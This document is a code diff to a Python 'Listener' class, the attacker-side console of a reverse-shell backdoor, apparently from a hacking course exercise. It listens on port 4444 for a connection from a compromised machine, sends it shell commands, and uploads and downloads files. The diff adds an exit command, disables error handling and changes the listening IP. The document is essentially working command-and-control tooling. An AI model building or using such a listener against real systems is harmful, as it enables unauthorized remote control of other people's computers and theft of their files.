@@ -10,7 +10,7 @@ class Listener:
         print("[+] Waiting for incoming connections")
         self.connection, address = listner.accept()
         print("[+] Got a connection from " + str(address))
-
+        
     def reliable_send(self, data):
         json_data = json.dumps(data)
         self.connection.send(json_data)
@@ -26,6 +26,11 @@ class Listener:
 
     def execute_remotely(self, command):
         self.connection.send(command)
+
+        if command[0] == "exit":
+            self.connection.close()
+            exit()
+
         return self.connections.recv(1024)
 
     def write_file(self, path, content):
@@ -42,19 +47,19 @@ class Listener:
             command = raw_input(">> ")
             command = command.split(" ")
 
-            try:
-                if command[0] == "upload":
-                    file_content = self.read_file(command[1])
-                    command.append(file_content)
+            # try:
+            if command[0] == "upload":
+                file_content = self.read_file(command[1])
+                command.append(file_content)
 
-                result = self.execute_remotely(command)
+            result = self.execute_remotely(command)
 
-                if command[0] == "download" and "[-] Error " not in result:
-                    result = self.write_file(command[1], result)
-            except Exception:
-                result = "[-] Error during command execution."
+            if command[0] == "download" and "[-] Error " not in result:
+                result = self.write_file(command[1], result)
+            # except Exception:
+            #     result = "[-] Error during command execution."
 
             print(result)
 
-my_listner = Listener("192.168.252.63", 4444)
+my_listner = Listener("10.100.102.6", 4444)
 my_listner.run()
